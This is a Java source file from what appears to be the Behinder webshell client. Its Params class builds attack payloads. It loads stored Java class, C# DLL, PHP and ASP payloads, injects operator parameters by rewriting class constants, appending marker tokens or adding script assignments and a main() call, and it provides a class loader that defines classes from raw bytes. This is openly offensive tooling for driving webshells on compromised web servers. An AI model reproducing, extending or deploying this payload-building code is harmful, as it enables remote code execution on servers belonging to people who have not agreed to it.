package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import net.rebeyond.behinder.utils.Utils;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.util.CheckClassAdapter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Iterator;
import java.util.Map;

public class Params {
    public Params() {
    }

    public static byte[] getParamedClass(String clsName, final Map params) throws Exception {
        ClassReader classReader = new ClassReader(clsName);
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new CheckClassAdapter(cw) {
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (params.containsKey(filedName)) {
                    String paramValue = (String) params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
                } else {
                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                }
            }
        }, 0);
        byte[] result = cw.toByteArray();
        return result;
    }

    public static byte[] getParamedClassForPlugin(String payloadPath, final Map params) throws Exception {
        ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new CheckClassAdapter(cw) {
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (params.containsKey(filedName)) {
                    String paramValue = (String) params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
                } else {
                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                }
            }
        }, 0);
        byte[] result = cw.toByteArray();
        return result;
    }

    public static byte[] getParamedAssembly(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/csharp/";
        String payloadPath = basePath + clsName + ".dll";
        byte[] result = Utils.getResourceData(payloadPath);
        if (params.keySet().size() == 0) {
            return result;
        } else {
            String paramsStr = "";
            String paramValue;
            for (String paramName : params.keySet()) {
                paramValue = Base64.encode(params.get(paramName).getBytes());
                paramsStr = paramsStr + paramName + ":" + paramValue + ",";
            }

            paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
            String token = "~~~~~~" + paramsStr;
            return Utils.mergeBytes(result, token.getBytes());
        }
    }

    public static byte[] getParamedAssemblyClassic(String clsName, Map<String,String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/csharp/";
        String payloadPath = basePath + clsName + ".dll";
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        for (Object o : params.keySet()) {
            String paraName = (String) o;
            String paraValue = (String) params.get(paraName);
            StringBuilder searchStr = new StringBuilder();

            while (searchStr.length() < paraValue.length()) {
                searchStr.append(paraName);
            }

            byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
            byte[] replacement = Utils.ascii2unicode(paraValue, 1);
            ReplacingInputStream ris = new ReplacingInputStream(bis, search, replacement);

            int b;
            while (-1 != (b = ris.read())) {
                bos.write(b);
            }

            ris.close();
        }

        return bos.toByteArray();
    }

    public static byte[] getParamedPhp(String clsName, Map<String,String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/php/";
        String payloadPath = basePath + clsName + ".php";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int b;
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }

        bis.close();
        code.append(bos.toString());
        String paraList = "";

        String paraName;
        for (Iterator var9 = params.keySet().iterator(); var9.hasNext(); paraList = paraList + ",$" + paraName) {
            paraName = (String) var9.next();
            String paraValue = (String) params.get(paraName);
            code.append(String.format("$%s=\"%s\";", paraName, paraValue));
        }

        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain(" + paraList + ");");
        return code.toString().getBytes();
    }

    public static byte[] getParamedAsp(String clsName, Map<String,String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/asp/";
        String payloadPath = basePath + clsName + ".asp";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int b;
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }

        bis.close();
        code.append(bos.toString());
        String paraList = "";
        if (params.size() > 0) {
            paraList = paraList + "Array(";

            String paraValueEncoded;
            for (Iterator var9 = params.keySet().iterator(); var9.hasNext(); paraList = paraList + "," + paraValueEncoded) {
                String paraName = (String) var9.next();
                String paraValue = (String) params.get(paraName);
                paraValueEncoded = "";

                for (int i = 0; i < paraValue.length(); ++i) {
                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
                }

                paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
            }

            paraList = paraList + ")";
        }

        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain " + paraList + "");
        return code.toString().getBytes();
    }

    public static class t extends ClassLoader {
        public t() {
        }

        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
}
